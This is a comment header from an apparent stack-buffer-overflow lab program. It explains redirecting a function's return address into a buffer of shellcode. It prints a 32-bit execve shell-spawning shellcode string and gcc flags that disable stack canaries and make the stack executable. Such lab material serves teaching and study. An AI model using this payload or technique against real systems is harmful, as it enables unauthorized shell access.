/*

Target of this program is to over flow stack in such a way that return address
from foo function changed to starting address of the buffer buffer contains the
executable shell code. This executable shell code might spawn a shell.

SHELLCODE : "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

Assume ASLR is turned off.

Compilation command:
gcc -m32 -g -fno-stack-protector exploit_me_2.c -o exploit_me_2 -z execstack

Arguments used:
	-m 32: instrcuting the compiler to build 32 bit Binary
	-g: This allow C code to visible in gdb
	-f no-stack-protector: Disbale stack protection by canary
    -z execstack: mark stack as executable
